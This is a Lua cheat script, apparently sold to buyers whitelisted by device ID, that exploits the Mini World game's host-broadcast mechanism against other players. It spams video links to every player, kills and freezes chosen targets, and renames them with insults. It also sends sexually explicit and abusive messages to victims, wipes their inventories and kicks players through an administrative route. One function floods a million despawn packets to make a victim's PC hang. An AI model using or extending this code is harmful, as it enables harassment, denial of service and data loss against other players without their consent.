    "Phát quảng bá video",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            -- 点击关闭：开关置false，循环自动终止
            _G.video_broadcast_loop = false
            ShowGameTipsWithoutFilter("#cFF0000Vòng lặp quảng bá video đã tắt, dừng gửi gói")
        elseif btnType == 1 then
            ShowGameTipsWithoutFilter("#c00ffffBắt đầu lặp gửi toàn bộ liên kết video trong danh sách trắng")
            local imgIdList = {
                "fe-test.mini1.cn/jsbridge/test.html?source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4",
                "https://fe-test.mini1.cn/jsbridge/test.html",
                "source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4&openBrowser=3&portrait=2",
                "https://activity.mini1.cn/game/videoplay.html?source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4&openBrowser=3&portrait=2",
                "http://ws-mdownload.mini1.cn/party/20221010110704.mp4",
                "https://mdownload.miniworldgame.com/party/20230317112429.mp4",
                "http://mdownload.miniworldgame.com/party/20230317105638.mp4",
                "https://mdownload.miniworldgame.com/party/20230317160258.mp4",
                "https://www.youtube.com/watchv=otK1gH_0mtA&t=12s",
                "https://mdownload.miniworldgame.com/party/20230320125716.mp4",
                "https://mdownload.miniworldgame.com/party/20230320130658.mp4",
                "https://mdownload.miniworldgame.com/party/20230619110237.mp4",
                "https://mdownload.miniworldgame.com/party/20240124143704.mp4",
                "https://www.bilibili.com/video/BV1pL411v7Aw?t=35.0",
                "https://youtu.be/TnvKu0I84tI"
            }
            -- 开启循环标记
            _G.video_broadcast_loop = true
            
            -- 只遍历一次房间所有玩家，缓存全部玩家uin，不再重复调用选择界面
            local targetUinList = {}
            ShowPlayerList(function(uin)
                table.insert(targetUinList, uin)
            end, "Đỉnh")

            threadpool:work(function()
                -- 外层一万次循环增加开关判断
                for a = 0, 10000 do
                    -- 检测关闭标记，直接跳出所有循环
                    if not _G.video_broadcast_loop then
                        break
                    end
                    threadpool:wait(0.1)
                    for _, imgid in ipairs(imgIdList) do
                        if not _G.video_broadcast_loop then
                            break
                        end
                        -- 直接用缓存好的玩家uin列表发包，无需重复打开选择玩家界面
                        for _, uin in ipairs(targetUinList) do
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, {"player", "openVideoUrl",{uin,imgid}})
                        end
                    end
                end
                ShowGameTipsWithoutFilter("#cFF0000Vòng lặp gửi video đã hoàn tất hoặc bị dừng thủ công")
            end)
        end
    end
)
end





function cjms()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author7[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng hạ gục tức thì\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng hạ gục tức thì")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu hạ gục tức thì",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần hạ gục tức thì")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu hạ gục tức thì")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp hạ gục tức thì 1000 lần không nghỉ")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    
                    while _G.dtms_enabled do
                        -- 无间隔连续执行1000次，内部不加任何wait
                        for loopCount = 1, 800 do
                            if not _G.dtms_enabled then
                                break
                            end
                            local dAttack = {
                                [1] = "gamerule",
                                [2] = "setKillNotify",
                                [3] = {true}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, dAttack)
                            end)
                            
                            
                            local diAttack = {
                                [1] = "gamerule",
                                [2] = "setScoreKillPlayer",
                                [3] = {100}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, diAttack)
                            end)
                            -- 每10次重新施加禁止攻击（防止被清除）
                            if loopCount % 10 == 1 then
                                local keepDisable = {
                                    [1] = "player",
                                    [2] = "setActionAttrState",
                                    [3] = {targetUin, 32, false}
                                }
                                pcall(function()
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                                end)
                            end
                            
                            local disableAttack = {
                                [1] = "player",
                                [2] = "forceOpenBoxUI",
                                [3] = {targetUin,797}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                            end)
                            
                            
                            
                            
                            
                            
                            local setNick = {
                                [1] = "actor",
                                [2] = "setnickname",
                                [3] = {targetUin,'#RChó'}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick)
                            end)
                            
                            local changeModel = {
                                [1] = "actor",
                                [2] = "changeCustomModel",
                                [3] = {targetUin,[=[mob_3407]=]}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)
                            end)
                            
                            local lockAttack = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin,32,false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, lockAttack)
                            end)
                            
                            -- ===== 设置目标为可攻击状态 =====
                            local setAttackable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 64, true}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                            end)
                            
                            -- ===== 清除目标无敌buff =====
                            local clearBuff = {
                                [1] = "buff",
                                [2] = "clearAllBuff",
                                [3] = {targetUin}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                            end)
                            
                            -- 播放特效
                            local t1 = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = {targetUin, "jiguang01", true}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                            end)
                            
                            local t10 = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = {targetUin, "aotu_06_leishenzhichui", true}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                            end)
                            
                            -- 设置属性
                            local t2 = {
                                [1] = "player",
                                [2] = "setAtt",
                                [3] = {targetUin, 1, 1}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                            end)
                            local t3 = {
                                [1] = "player",
                                [2] = "setAtt",
                                [3] = {targetUin, 1, 2}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                            end)
                            
                            -- 造成伤害
                            local t4 = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = {myUin, targetUin, 1.8e+308, 0}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                            end)
                            
                            -- 每100次提示进度
                            if loopCount % 100 == 0 then
                                ShowGameTipsWithoutFilter("#c00ffffTiến độ vòng này " .. loopCount .. "/1000")
                            end
                            -- 循环内部无任何等待，一次性跑完1000次
                        end

                        -- 1000次全部跑完后判断开关，关闭就直接跳出
                        if not _G.dtms_enabled then
                            break
                        end
                        
                        ShowGameTipsWithoutFilter("#c00ffffĐã hoàn thành 1000 lần hạ gục tức thì, tạm dừng 1 giây để tránh treo")
                        -- 仅整轮结束后等待1秒缓冲
                        threadpool:wait(5)
                    end
                    
                    -- 结束恢复目标攻击权限
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Đã khôi phục khả năng tấn công của mục tiêu")
                    end)
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì đã chấm dứt")
                end)
            end
            -- ====================
        end
    end
)
end


function zdcr()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author6[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止 =====
            _G.cr_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            
            -- 可选：恢复所有玩家移动
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.cr_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}  -- true = 恢复移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho tất cả người chơi")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启 =====
            _G.cr_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.cr_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.cr_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần thao tác")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---

                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp đưa lên đầu mình")
                
                -- 启动循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.cr_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 功能：传送到头上 =====
                        local myX, myY, myZ = CurMainPlayer:getPosition(0, 0, 0)
                        local target_x, target_y, target_z = myX / 100, myY / 100 -0.1, myZ / 100+1
                        
                        
                        local tdata1 = {
                            [1] = "player",
                            [2] = "setPosition",
                            [3] = { targetUin, target_x, target_y, target_z }
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) 
                        end)
                        -- =================================
                        
                        -- ===== 禁止移动功能 =====
                        local tdata2 = {}
                        tdata2[1] = "player"
                        tdata2[2] = "setActionAttrState"
                        tdata2[3] = {targetUin, 1, false}  -- false = 禁止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) 
                        end)
                        
 local tdata3 = {
                            [1] = "player",
                            [2] = "playAct",
                            [3] = {targetUin, 15}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata3) 
                        end)
                        local tdata4 = {
                            [1] = "player",
                            [2] = "notifyGameInfo2Self",
                            [3] = {targetUin, "A~~ cái 78 của bố to quá, con thích lắm, mạnh lên~ a~ mạnh lên"}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata4) 
                        end)
                        
                        local tdata5 = {
                            [1] = "player",
                            [2] = "notifyGameInfo2Self",
                            [3] = {AccountManager:getUin(), "A~~ cái 78 của bố to quá, con thích lắm, mạnh lên~ a~ mạnh lên"}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata5) 
                        end)
                        
                        
                        MusicClubSyncIns:sysncEquipWeapon(AccountManager:getUin(), 12285)
CurMainPlayer:playAct(600113)
                        
                        
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x = x / 100
local new_y = y / 100
local new_z = z / 100
threadpool:wait(0.1) 
CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, 'buff.buff_balala_xiaolan', 70, 50, 0, new_x, new_y, new_z, 0, 1, 100)
                        
                        
                        
                        -- =======================
                        
                        -- 每10次显示一次提示
                       
                        
                        threadpool:wait(0.1)  -- 0.01秒执行一次（非常快）
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end

function zdtzw()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author5[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 默认配置
local defaultItemId = 15509  -- 默认火龙果

-- 先弹出输入框让用户输入物品ID
ShowTextInputSafe(function(text)
    local itemId = tonumber(text)
    if not itemId or itemId <= 0 then
        ShowGameTipsWithoutFilter("#cFF0000Hãy nhập ID vật phẩm hợp lệ!")
        return
    end
    
    -- 显示确认对话框
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Bên trái dừng\nBên phải bật\n#c00ffffID vật phẩm hiện tại:" .. itemId,
        "Điều khiển",
        nil,
        function(userData, btnType)
            if btnType == 0 then  -- 左边按钮：停止
                _G.ztmn_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
                
            elseif btnType == 1 then  -- 右边按钮：开启
                _G.ztmn_enabled = true
                ShowGameTipsWithoutFilter("#c00ffffĐã bật - ID vật phẩm:" .. itemId)
                
                -- 启动炸图循环
                threadpool:work(function()
                    while _G.ztmn_enabled do
                        -- 获取自己当前位置
                        local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                        local center_x = my_x / 100
                        local center_y = my_y / 100
                        local center_z = my_z / 100
                        
                        -- 向四面八方发射（8个方向）
                        for angle = 0, 315, 45 do
                            local rad = math.rad(angle)
                            local distance = math.random(50, 100)
                            local target_x = center_x + math.cos(rad) * distance
                            local target_z = center_z + math.sin(rad) * distance
                            local target_y = center_y
                            
                            -- 发射投掷物（使用自定义物品ID）
                            local tdata = {
                                [1] = "world",
                                [2] = "spawnProjectile",
                                [3] = {
                                    AccountManager:getUin(),
                                    itemId,  -- 使用自定义ID
                                    center_x, center_y + 2, center_z,
                                    target_x, target_y, target_z,
                                    500
                                }
                            }
                            
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                        
                        threadpool:wait(0.2)
                    end
                end)
            end
        end
    )
end, "Hãy nhập ID vật phẩm", "Thiết lập", "15509")
end

function ExecuteAntiBotLogic()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author1[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("Bật thành công")
for a=0,100000 do 
    threadpool:wait(0.00000001)
    
    trigger()
local curHp = GameVM.Trigger.Player:getPlayerAttr(AccountManager:getUin(), PLAYERATTR.CUR_HP)
-- 判断血量低于1时执行死亡逻辑
if curHp < 1 then
    -- 延迟极短时间，等待游戏底层血量状态同步完成
    threadpool:wait(0.00000001)
              -- 获取自己的迷你号
    -- 先拿到自己的迷你号，用来过滤
local myUin = AccountManager:getUin()
local num = ClientCurGame:getNumPlayerBriefInfo()
for i = 1, num do
    local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
    -- 增加 briefInfo.uin ~= myUin 排除自己
    if briefInfo and briefInfo.uin and briefInfo.uin > 1000 and briefInfo.uin ~= myUin then
 
 for a=0,1000 do
 
            local tdata = {
                [1] = "player",
                [2] = "notifyGameInfo2Self",
                [3] = { briefInfo.uin, "Tao treo mẹ mày lên trần nhà, mẹ mày khen tao giỏi, thè lưỡi ra phục vụ tao, còn nói của tao rất lớn và muốn tao làm cha dượng của mày" }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
 end
local tdata = {
        [1] = "gamerule",
        [2] = "setAllowMidwayJoin",
        [3] = { 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

  threadpool:wait(0.01)
    AccountManager.cluster.buddysvr.routemore('gm.kick', briefInfo.uin,0)
    end -- 补全if闭合
end -- 补全for循环闭合


end
end
end




function bdn()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author2[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("Bật thành công, có thể bị lag một lúc")

 ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
    for a=0,1000000 do 
        local tdata = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    end, "Làm treo PC")

end


function xhjs()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
-- 获取玩家当前血量
ShowGameTipsWithoutFilter("Bật thành công")
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng\nBên phải bật",
    "Đóng",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            _G.dffz_enabled = false
            -- 不要停止线程，让它自己检测到 false 后退出
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng")
            
        elseif btnType == 1 then
            -- 重置状态
            _G.dffz_enabled = false
            
            -- 等待旧线程完全退出（如果有的话）
            if _G.dffz_thread then
                -- 不调用 stop，让线程自然退出
                _G.dffz_thread = nil
            end
            
            -- 延迟一下再开启，确保旧线程已退出
            threadpool:wait(0.1)
            
            _G.dffz_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật")
            
            if whitelist == nil then
                whitelist = {}
            end
            
            -- 使用 threadpool:work 创建新线程
            _G.dffz_thread = threadpool:work(function()
                local loopCount = 0
                while _G.dffz_enabled do
                    loopCount = loopCount + 1
                    
                    xpcall(function()
                        local myUin = AccountManager:getUin()
                        local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                        
                        for i = 1, size do
                            if not _G.dffz_enabled then break end
                            local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                            if targetPlayer then
                                local targetUin = targetPlayer:getUin()
                                if targetUin ~= myUin then
                                    if not whitelist[targetUin] then
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changPlayerMoveType"
                                        tdata[3] = {targetUin, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetTimeVanishingSpeed"
                                        tdata[3] = {500}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "changeViewMode"
                                        tdata[3] = {targetUin, 9, true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "forceOpenBoxUI"
                                        tdata[3] = {targetUin, 797}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "changeCustomModel"
                                        tdata[3] = {targetUin, "role_11"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "chat"
                                        tdata[2] = "sendChat"
                                        tdata[3] = {"#cFFAAFI#cFFFFAAA#cFFBBEEM#cEEFFAAH#cFFCCDDH#cDDFFAAA#cFFDDCCI#cCCFFAAC#cFFEEBBA", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "notifyGameInfo2Self"
                                        tdata[3] = {targetUin, "#cFFFFAAVương #cEEFFAAquyền #cDDFFAAnắm #cCCFFAAGiữ #cBBFFAAsinh #cAAFFAAtử"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "setnickname"
                                        tdata[3] = {targetUin, "#b#RTrung Hoa vạn tuế"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "backpack"
                                        tdata[2] = "clearAllPack"
                                        tdata[3] = {targetUin}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {targetUin, 1, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {myUin, 64, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = {myUin, 128, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30005, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30006, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30007, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30008, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world"
                                        tdata[2] = "SetSkyBoxMaps"
                                        tdata[3] = {1, 30009, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playerHurt"
                                        tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setAtt"
                                        tdata[3] = {targetUin, 1, 2}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "yanhua", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "12834", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "bossskill_lasertailblue", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "ice_bingshi_boss", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "mob_3514_white", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "nengliang_xiqu", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {myUin, "nengliang_baozha", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor"
                                        tdata[2] = "playBodyEffectByFile"
                                        tdata[3] = {targetUin, "jiguang01", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end
                                end
                            end
                        end
                    end, function(err)
                        print("炸图循环错误: " .. tostring(err))
                    end)
                    
                    -- 使用 threadpool:wait
                    threadpool:wait(0.0000001)
                end
                print("炸图循环已退出")
                _G.dffz_thread = nil  -- 线程退出后清空引用
            end)
        end
    end
)
	end

-- ============================================================
-- THÊM VÀO ĐẦU MENU 112 (SAU PHẦN WHITELIST)
-- ============================================================

-- ===== ANTI VARIABLES =====
_G.antiBlackScreenLoop = false
_G.antiGravityLoop = false
_G.antiSizeLoop = false
